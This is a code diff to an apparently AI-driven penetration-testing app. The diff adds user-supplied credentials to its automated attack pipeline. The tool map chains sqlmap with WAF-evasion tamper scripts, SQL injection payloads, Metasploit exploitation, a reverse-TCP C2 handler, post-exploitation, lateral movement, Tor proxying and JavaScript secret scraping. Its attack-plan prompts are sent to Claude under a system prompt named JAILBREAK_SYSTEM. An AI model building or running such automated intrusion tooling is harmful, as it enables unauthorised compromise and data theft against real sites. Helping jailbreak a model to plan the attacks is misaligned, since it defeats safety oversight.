@@ -1262,6 +1262,8 @@ function PentestView({ apiKey, mcpUrl, mcpTools, onPlanUpdate, webhookUrl, onPen
     post_exploit: false,     proxychains_wrap: false,
   });
   const [mission,    setMission]    = useState(() => LS.get('kgb_mission', ''));
+  const [authUser,   setAuthUser]   = useState(() => LS.get('kgb_auth_user', ''));
+  const [authPass,   setAuthPass]   = useState(() => LS.get('kgb_auth_pass', ''));
   const [autoMode,   setAutoMode]   = useState(false);
   const [xssCallback,setXssCallback]= useState('');
   const [brain,      setBrain]      = useState(() => LS.get('manucas_pentest_brain', {}));
@@ -1425,7 +1427,7 @@ MANDATORY CHAINING RULES:
   const TOOL_MAP = {
     subfinder:    { tool: 'subfinder', args: (t) => ({ domain: t.replace(/https?:\/\//, '').split('/')[0], flags: '-silent -all -recursive -max-depth 3' }) },
     httpx:        { tool: 'httpx',     args: (t) => ({ target: t, flags: '-status-code -title -tech-detect -cdn -ip -cname -server -ports 80,443,8080,8443,8000,8888,3000,4000,5000,9000,9090 -follow-redirects -random-agent -silent' }) },
-    ghauri:       { tool: 'ghauri',    args: (t) => ({ url: t, flags: '--dbs --batch --forms --crawl=2 --level=3' }) },
+    ghauri:       { tool: 'ghauri',    args: (t) => ({ url: t, flags: authUser ? `--dbs --batch --forms --crawl=2 --level=3 --data='username=${authUser}&password=${authPass}' -p username,password` : '--dbs --batch --forms --crawl=2 --level=3' }) },
     ffuf:         { tool: 'ffuf',      args: (t) => ({ url: `${ct(t)}/FUZZ`, extensions: 'php,asp,aspx,jsp,txt,bak,old,zip,env,conf,log,json,xml,yaml', flags: '-mc 200,201,204,301,302,307,403 -fc 404,429 -recursion -recursion-depth 2 -t 50 -timeout 10' }) },
     aquatone:     { tool: 'aquatone',  args: (t) => ({ hosts: t, flags: '-ports xlarge -timeout 3000' }) },
     burp_suite:   { tool: 'shell',     args: ()  => ({ command: 'nohup burpsuite &>/dev/null &' }) },
@@ -1433,7 +1435,7 @@ MANDATORY CHAINING RULES:
     katana_crawl: { tool: 'shell',     args: (t) => ({ command: `if command -v katana &>/dev/null; then katana -u "${t}" -depth 3 -js-crawl -known-files all -no-color -silent 2>/dev/null | head -100; elif command -v gau &>/dev/null; then gau "${t.replace(/https?:\/\//, '')}" 2>/dev/null | head -60 | while read URL; do CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 "$URL" 2>/dev/null); echo "[$CODE] $URL"; done | head -60; else curl -sk -L -m 20 "${t}" 2>/dev/null | grep -oE '(href|src|action)="[^"]{5,100}"' | tr -d '"' | sed 's/^href=//;s/^src=//;s/^action=//' | sort -u | head -50; fi` }) },
     nuclei_fast:  { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'cves,misconfig,exposure,vulnerabilities,default-logins,takeovers,technologies,headless,file,network', severity: 'critical,high,medium', flags: '-rl 150 -bs 30 -c 30 -no-color', timeout: 300 }) },
     nuclei_exploit:{ tool: 'nuclei',   args: (t) => ({ target: t, templates: 'exploits,cves,vulnerabilities', severity: 'critical,high', flags: '-rl 50 -no-color', timeout: 240 }) },
-    sqli_scan:    { tool: 'sqlmap',    args: (t) => ({ target: t, flags: '--batch --dbs --forms --crawl=2 --level=5 --risk=3 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest,modsecurityversioned --random-agent --time-sec=5 --threads=5 --smart', timeout: 240 }) },
+    sqli_scan:    { tool: 'sqlmap',    args: (t) => ({ target: t, flags: `--batch --dbs --forms --crawl=2 --level=5 --risk=3 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest,modsecurityversioned --random-agent --time-sec=5 --threads=5 --smart${authUser ? ` --data='username=${authUser}&password=${authPass}' -p username,password` : ''}`, timeout: 240 }) },
     xss_check:    { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'xss,headless', severity: 'high,medium,low', flags: '-rl 50 -no-color' }) },
     cors_check:   { tool: 'shell',     args: (t) => ({ command: `echo "=== CORS MISCONFIG TEST ===" && for ORIGIN in "https://evil.com" "https://attacker.com" "null" "http://localhost"; do RESP=$(curl -sk -I -m 10 -H "Origin: $ORIGIN" "${t}" 2>/dev/null | grep -iE "access-control"); echo "Origin=$ORIGIN -> $RESP"; done && echo "--- Null origin ---" && curl -sk -I -m 10 -H "Origin: null" "${t}" 2>/dev/null | grep -iE "access-control" && echo "--- Nuclei CORS ---" && nuclei -u "${t}" -tags cors,misconfig -severity critical,high,medium,low -no-color 2>&1 | head -25` }) },
     js_analyze:   { tool: 'shell',     args: (t) => ({ command: `echo "=== TECH FINGERPRINT ===" && whatweb -a 3 "${t}" 2>/dev/null | head -15 && echo "=== SECURITY HEADERS ===" && curl -skI -L -m 10 "${t}" 2>/dev/null | grep -iE "(server:|x-powered-by:|x-generator:|x-aspnet|cf-ray:|set-cookie:)" && echo "=== JS SECRET EXTRACTION ===" && curl -sk -L -m 20 "${t}" 2>/dev/null > /tmp/kgb_page.html && BASE=$(echo "${t}" | grep -oE "https?://[^/]+") && grep -oE 'src="[^"]+[.]js[^"]*"' /tmp/kgb_page.html | grep -oE '"[^"]*"' | tr -d '"' | grep -vE "(jquery|bootstrap|analytics|gtag|fontawesome)" | head -8 | while read JSPATH; do FULL=$(echo "$JSPATH" | grep -qE "^https?://" && echo "$JSPATH" || echo "$BASE/$JSPATH"); echo "--- $FULL ---"; curl -sk -L -m 12 "$FULL" 2>/dev/null > /tmp/kgb_js.tmp; grep -iE "apikey|api_key|secret|password|access_token|private_key|aws_access" /tmp/kgb_js.tmp | grep -oE "[A-Za-z0-9+/=_-]{15,}" | head -6; grep -oE '"/api/[^"]{3,60}"' /tmp/kgb_js.tmp | sort -u | head -8; grep -oE '"/v[12]/[^"]{3,60}"' /tmp/kgb_js.tmp | sort -u | head -5; done && echo "=== SOURCE MAPS ===" && grep -oE "assets/[a-zA-Z0-9_-]+[.]js" /tmp/kgb_page.html 2>/dev/null | head -3 | while read F; do CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 "${t.replace(/\/$/, '')}/$F.map"); echo "[MAP:$CODE] $F.map"; done 2>&1 | head -80` }) },
@@ -1513,20 +1515,20 @@ fi
     waf_bypass:     { tool: 'waf_bypass',     args: (t) => ({ target: t, mode: 'full' }) },
     msf_exploit:    { tool: 'msf_exploit',    args: (t, cve) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: cve || 'recent', lport: '4444' }) },
     payload_mutate: { tool: 'payload_mutate', args: (t) => ({ target: ct(t) + '?id=FUZZ', payload: "' OR 1=1--", type: 'sqli' }) },
-    crawl_auth:     { tool: 'crawl_auth',     args: (t) => ({ target: t, username: 'admin', password: 'admin' }) },
+    crawl_auth:     { tool: 'crawl_auth',     args: (t) => ({ target: t, username: authUser || 'admin', password: authPass || 'admin' }) },
     idor_test:      { tool: 'idor_test',      args: (t) => ({ target: ct(t) + '/api/user/1', range: '1-100' }) },
     second_order:   { tool: 'second_order',   args: (t) => ({ target: t, inject_path: '/register', trigger_path: '/profile', field: 'username' }) },
     bizlogic_fuzz:  { tool: 'bizlogic_fuzz',  args: (t) => ({ target: t, endpoint: '/cart/add', mode: 'all' }) },
     evasion_scan:   { tool: 'evasion_scan',   args: (t) => ({ target: t, mode: 'full' }) },
     c2_handler:     { tool: 'c2_handler',     args: ()  => ({ payload: 'linux/x86/shell/reverse_tcp', lport: '4444' }) },
     lateral_move:   { tool: 'lateral_move',   args: (t) => ({ pivot_host: t.replace(/https?:\/\//, '').split('/')[0], mode: 'enum' }) },
-    playwright_crawl:{ tool: 'playwright_crawl', args: (t) => ({ target: t, depth: 2, actions: 'all', timeout: 300 }) },
+    playwright_crawl:{ tool: 'playwright_crawl', args: (t) => ({ target: t, depth: 2, actions: 'all', timeout: 300, ...(authUser ? { username: authUser, password: authPass } : {}) }) },
     adaptive_mutate:{ tool: 'adaptive_mutate',  args: (t) => ({ target: ct(t) + '?id=INJECT', payload: "' OR 1=1--", type: 'sqli', rounds: 5 }) },
     cve_rag:        { tool: 'cve_rag',         args: (t) => ({ product: 'apache', version: 'detected', severity: 'high', limit: 10 }) },
-    session_manage: { tool: 'session_manage',  args: (t) => ({ target: ct(t) + '/login', action: 'login', username: 'admin', password: 'admin' }) },
+    session_manage: { tool: 'session_manage',  args: (t) => ({ target: ct(t) + '/login', action: 'login', username: authUser || 'admin', password: authPass || 'admin' }) },
     mitmproxy_scan:  { tool: 'mitmproxy_scan',  args: (t) => ({ target: t, port: 8080, mode: 'fuzz', duration: 30 }) },
     info_disclosure: { tool: 'info_disclosure', args: (t) => ({ target: t, deep: true }) },
-    session_chain:   { tool: 'session_chain',   args: (t) => ({ target: t, username: 'admin', password: 'admin', id_range: '1-100' }) },
+    session_chain:   { tool: 'session_chain',   args: (t) => ({ target: t, username: authUser || 'admin', password: authPass || 'admin', id_range: '1-100' }) },
     post_exploit:    { tool: 'post_exploit',    args: (t) => ({ host: t.replace(/https?:\/\//, '').split('/')[0], session: '1', lport: '4444' }) },
     dynamic_mutate:  { tool: 'dynamic_mutate',  args: (t) => ({ target: ct(t) + '?id=FUZZ', payloads: [], waf_fingerprint: 'unknown' }) },
     proxychains_wrap:{ tool: 'proxychains_wrap', args: (t) => ({ command: `curl -si --max-time 10 ${t}`, proxy: 'tor' }) },
@@ -1623,8 +1625,9 @@ fi
     try {
       setLog(prev => [...prev, { t: 'info', m: 'APEX a gerar PLANO de ataque...' }]);
       const missionCtx = mission.trim() ? `\nMISSÃO PRIMÁRIA (OBRIGATÓRIO CUMPRIR): ${mission.trim()}\n` : '';
+      const credsCtxPlan = authUser ? `\nCREDENCIAIS FORNECIDAS: username=${authUser} password=${authPass}\nO utilizador tem acesso autenticado. Incluir no plano: session_manage para login, crawl_auth + playwright_crawl para crawl autenticado, idor_test + session_chain em áreas protegidas, sqli_scan nos formulários autenticados.\n` : '';
       const planRes = await window.electron.callClaude({
-        messages: [{ role: 'user', content: `TARGET: ${target}${brainCtx}${missionCtx}\nGera um PLANO DE ATAQUE detalhado. Responde APENAS em JSON:\n{"plano":[{"step":1,"objective":"...","tools":["tool1"],"reason":"..."}],"priority_vectors":["sqli","xss"],"notes":"observacoes sobre o alvo"}` }],
+        messages: [{ role: 'user', content: `TARGET: ${target}${brainCtx}${missionCtx}${credsCtxPlan}\nGera um PLANO DE ATAQUE detalhado. Responde APENAS em JSON:\n{"plano":[{"step":1,"objective":"...","tools":["tool1"],"reason":"..."}],"priority_vectors":["sqli","xss"],"notes":"observacoes sobre o alvo"}` }],
         apiKey,
         system: JAILBREAK_SYSTEM,
       });
@@ -1714,7 +1717,8 @@ fi
       ].filter(Boolean).join('\n');
       const summaryCtx = prevSummary ? `\nCONTEXTO ROUNDS ANTERIORES (comprimido):\n${prevSummary}\n` : '';
       const missionLine = mission.trim() ? `\nMISSÃO PRIMÁRIA (OBRIGATÓRIO CUMPRIR): ${mission.trim()}\n` : '';
-      return `TARGET: ${target}\nROUND: ${rnd}\n${brainCtx}${missionLine}${summaryCtx}${ techContext ? `\nTECH CONTEXT:\n${techContext}\n` : ''}\nRESULTADOS ROUND ${rnd}:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n⚠️ ANTI-HALLUCINATION RULE (MANDATORY): ONLY report findings EXPLICITLY present in the tool outputs above. NEVER invent, assume or guess data — especially usernames, passwords, database names, table names, column names, file contents or CVEs. If a tool returned empty output or errors, report it as such. Every finding must be directly quotable from the results above.\n\n`
+      const credsLine = authUser ? `\nCREDENCIAIS ATIVAS: username=${authUser} password=${authPass} — JÁ USADAS em session_manage/crawl_auth. Testa: IDOR em endpoints autenticados, SQLi em formulários autenticados, broken access control entre utilizadores, privilege escalation.\n` : '';
+      return `TARGET: ${target}\nROUND: ${rnd}\n${brainCtx}${credsLine}${missionLine}${summaryCtx}${ techContext ? `\nTECH CONTEXT:\n${techContext}\n` : ''}\nRESULTADOS ROUND ${rnd}:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n⚠️ ANTI-HALLUCINATION RULE (MANDATORY): ONLY report findings EXPLICITLY present in the tool outputs above. NEVER invent, assume or guess data — especially usernames, passwords, database names, table names, column names, file contents or CVEs. If a tool returned empty output or errors, report it as such. Every finding must be directly quotable from the results above.\n\n`
       + (autoMode
         ? `Analisa como APEX pentester elite. Cobre OWASP Top 10 2025. Verifica cookies, sessions, IDOR, business logic, injection, crypto.
 REGRAS DE CHAINING OBRIGATÓRIAS:
@@ -1947,6 +1951,33 @@ Responde em JSON: {"api_endpoints":[], "idor_candidates":[], "hardcoded_secrets"
           onFocus={e => (e.target.style.borderColor = '#a78bfa')}
           onBlur={e  => (e.target.style.borderColor = C.border)}
         />
+        {/* Credentials */}
+        <div className="mt-2">
+          <div className="font-mono text-[9px] uppercase tracking-widest mb-1" style={{ color: C.textDim }}>Credenciais (opcional)</div>
+          <div className="flex gap-2">
+            <input
+              type="text"
+              value={authUser}
+              onChange={e => { setAuthUser(e.target.value); LS.set('kgb_auth_user', e.target.value); }}
+              placeholder="username / email"
+              className="flex-1 rounded-lg px-2 py-1.5 font-mono text-[10px] outline-none transition-all"
+              style={{ background: C.bg, border: `1px solid ${C.border}`, color: C.text, caretColor: C.red }}
+              onFocus={e => (e.target.style.borderColor = C.red)}
+              onBlur={e  => (e.target.style.borderColor = C.border)}
+            />
+            <input
+              type="password"
+              value={authPass}
+              onChange={e => { setAuthPass(e.target.value); LS.set('kgb_auth_pass', e.target.value); }}
+              placeholder="password"
+              className="flex-1 rounded-lg px-2 py-1.5 font-mono text-[10px] outline-none transition-all"
+              style={{ background: C.bg, border: `1px solid ${C.border}`, color: C.text, caretColor: C.red }}
+              onFocus={e => (e.target.style.borderColor = C.red)}
+              onBlur={e  => (e.target.style.borderColor = C.border)}
+            />
+          </div>
+          {authUser && <div className="font-mono text-[8px] mt-0.5" style={{ color: C.green, opacity: 0.8 }}>✓ modo autenticado — ferramentas usarão estas credenciais</div>}
+        </div>
         {/* Multi-target queue */}
         <div className="mt-2">
           <div className="flex items-center gap-2 mb-1.5">
